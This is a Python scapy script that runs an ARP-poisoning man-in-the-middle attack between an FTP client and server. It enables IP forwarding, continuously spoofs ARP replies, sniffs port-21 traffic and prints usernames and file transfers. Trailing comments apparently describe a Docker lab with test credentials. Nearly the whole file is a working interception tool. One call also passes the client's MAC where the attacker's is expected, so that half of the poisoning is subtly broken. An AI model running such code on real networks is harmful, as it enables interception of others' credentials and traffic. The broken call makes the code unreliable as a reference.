#!/usr/bin/env python3

import argparse
import scapy.all as scapy
import re
import time
import signal
import sys
import os
from threading import Thread

def error_exit(msg):
    print(f"Error: {msg}", file=sys.stderr)
    sys.exit(1)

def enable_ip_forwarding():
    """Enable IP forwarding in the kernel"""
    try:
        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
        print("IP forwarding enabled")
    except Exception as e:
        error_exit(f"Failed to enable IP forwarding: {e}")

def disable_ip_forwarding():
    """Disable IP forwarding"""
    try:
        os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
        print("IP forwarding disabled")
    except:
        pass

def get_attacker_mac(interface):
    """Get the attacker's MAC address for the specified interface"""
    try:
        # Get attacker's own MAC address
        mac = scapy.get_if_hwaddr(interface)
        return mac
    except:
        error_exit(f"Could not get MAC address for interface {interface}")

def spoof(victim_ip, victim_mac, gateway_ip, attacker_mac):
    """Tell victim that attacker is the gateway"""
    ether = scapy.Ether(dst=victim_mac, src=attacker_mac)
    arp = scapy.ARP(pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=attacker_mac, op='is-at')
    packet = ether / arp
    scapy.sendp(packet, verbose=0)

def spoof_gateway(gateway_ip, gateway_mac, victim_ip, attacker_mac):
    """Tell gateway that attacker is the victim"""
    ether = scapy.Ether(dst=gateway_mac, src=attacker_mac)
    arp = scapy.ARP(pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip, hwsrc=attacker_mac, op='is-at')
    packet = ether / arp
    scapy.sendp(packet, verbose=0)
    
# def spoof(victim_ip, victim_mac, gateway_ip, attacker_mac):
#     """Tell victim that attacker is the gateway"""
#     packet = scapy.Ether(dst=victim_mac) / scapy.ARP(pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=attacker_mac, op='is-at')
#     scapy.sendp(packet, verbose=0)

# def spoof_gateway(gateway_ip, gateway_mac, victim_ip, attacker_mac):
#     """Tell gateway that attacker is the victim"""
#     packet = scapy.Ether(dst=gateway_mac) / scapy.ARP(pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip, hwsrc=attacker_mac, op='is-at')
#     scapy.sendp(packet, verbose=0)

def restore(victim_ip, victim_mac, gateway_ip, gateway_mac):
    """Restore victim's ARP table"""
    packet = scapy.Ether(dst=victim_mac) / scapy.ARP(pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=gateway_mac, op='is-at')
    scapy.sendp(packet, verbose=0, count=5)
    print(f"ARP table restored for {victim_ip}")

def restore_gateway(gateway_ip, gateway_mac, victim_ip, victim_mac):
    """Restore gateway's ARP table"""
    packet = scapy.Ether(dst=gateway_mac) / scapy.ARP(pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip, hwsrc=victim_mac, op='is-at')
    scapy.sendp(packet, verbose=0, count=5)
    print(f"ARP table restored for {gateway_ip}")

def packet_callback(packet):
    if packet.haslayer(scapy.TCP) and packet.haslayer(scapy.Raw):
        # Check if it's FTP traffic (port 21)
        if packet[scapy.TCP].dport == 21 or packet[scapy.TCP].sport == 21:
            payload = packet[scapy.Raw].load
            try:
                payload_str = payload.decode('utf-8', errors='ignore')
                
                # Look for FTP commands
                if "RETR" in payload_str:
                    filename = payload_str.split('RETR ')[1].split('\r\n')[0]
                    print(f"[FTP DOWNLOAD] Client downloading: {filename}")
                elif "STOR" in payload_str:
                    filename = payload_str.split('STOR ')[1].split('\r\n')[0]
                    print(f"[FTP UPLOAD] Client uploading: {filename}")
                elif "USER" in payload_str:
                    username = payload_str.split('USER ')[1].split('\r\n')[0]
                    print(f"[FTP LOGIN] Username: {username}")
                elif "PASS" in payload_str:
                    print(f"[FTP LOGIN] Password sent")
                    
            except Exception as e:
                pass  # Ignore decoding errors

def exit_gracefully(signum, frame):
    global client_ip, client_mac, server_ip, server_mac, attacker_mac, running
    print("\nStopping attack and restoring network...")
    running = False
    disable_ip_forwarding()
    restore(client_ip, client_mac, server_ip, server_mac)
    restore_gateway(server_ip, server_mac, client_ip, client_mac)
    sys.exit(0)

def is_valid_ip(ip_str):
    try:
        parts = ip_str.split('.')
        if len(parts) != 4:
            return False
        for part in parts:
            num = int(part)
            if num < 0 or num > 255:
                return False
        return True
    except (ValueError, AttributeError):
        return False

def is_valid_mac(mac_str):
    mac_pattern = re.compile(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$')
    return bool(mac_pattern.match(mac_str))

def validate_args(args):
    if not is_valid_ip(args.client_ip):
        error_exit("Invalid client IP address")
    if not is_valid_mac(args.client_mac):
        error_exit("Invalid client MAC address")
    if not is_valid_ip(args.server_ip):
        error_exit("Invalid server IP address")
    if not is_valid_mac(args.server_mac):
        error_exit("Invalid server MAC address")

def parse_args():
    parser = argparse.ArgumentParser(description="ARP poisoning MITM attack for FTP monitoring")
    parser.add_argument("client_ip", type=str, help="FTP Client IP address")
    parser.add_argument("client_mac", type=str, help="FTP Client MAC address")
    parser.add_argument("server_ip", type=str, help="FTP Server IP address")
    parser.add_argument("server_mac", type=str, help="FTP Server MAC address")
    parser.add_argument("-i", "--interface", type=str, default="eth0", 
                       help="Network interface (default: eth0)")
    return parser.parse_args()

def main():
    global client_ip, client_mac, server_ip, server_mac, attacker_mac, running
    
    try:
        args = parse_args()
        validate_args(args)
        
        # Get attacker's MAC address
        attacker_mac = get_attacker_mac(args.interface)
        
        # Store values globally
        client_ip = args.client_ip
        client_mac = args.client_mac
        server_ip = args.server_ip
        server_mac = args.server_mac
        running = True
        
        # Set up signal handlers
        signal.signal(signal.SIGINT, exit_gracefully)
        signal.signal(signal.SIGTERM, exit_gracefully)
        
        # Enable IP forwarding
        enable_ip_forwarding()
        
        print(f"Starting ARP poisoning MITM attack")
        print(f"FTP Client: {client_ip} ({client_mac})")
        print(f"FTP Server: {server_ip} ({server_mac})")
        print(f"Attacker MAC: {attacker_mac}")
        print(f"Interface: {args.interface}")
        print("Press Ctrl+C to stop\n")
        
        # Start packet sniffing in a separate thread
        def sniff_thread():
            scapy.sniff(iface=args.interface, prn=packet_callback, 
                       filter="tcp port 21", store=False)
        
        sniff_thread_obj = Thread(target=sniff_thread, daemon=True)
        sniff_thread_obj.start()
        
        # Counter for reducing spam
        packet_counter = 0
        
        # Main thread does continuous ARP poisoning
        while running:
            try:
                # Tell client that attacker is the server
                spoof(client_ip, client_mac, server_ip, attacker_mac)
                
                # Tell server that attacker is the client
                spoof_gateway(server_ip, server_mac, client_ip, client_mac)
                
                packet_counter += 2
                if packet_counter % 20 == 0:  # Print every 10 cycles
                    print(f"ARP poisoning active... ({packet_counter} packets sent)")
                
                time.sleep(2)
            except Exception as e:
                print(f"Error during spoofing: {e}")
                time.sleep(5)
                
    except KeyboardInterrupt:
        exit_gracefully(None, None)
    except Exception as e:
        error_exit(str(e))

if __name__ == '__main__':
    main()
    

# 	# Enter the FTP client container
# docker exec -it ftp-client sh

# # Connect to the FTP server
# ftp 172.28.0.10
# # OR
# ftp ftp-server

# # Login with:
# # Username: ftpuser
# # Password: testpass

# # Create a test file in the client container
# echo "test data" > /shared/test.txt

# # In FTP session:
# put /shared/test.txt    # Upload to server
# get test.txt           # Download from server

# docker logs -f attacker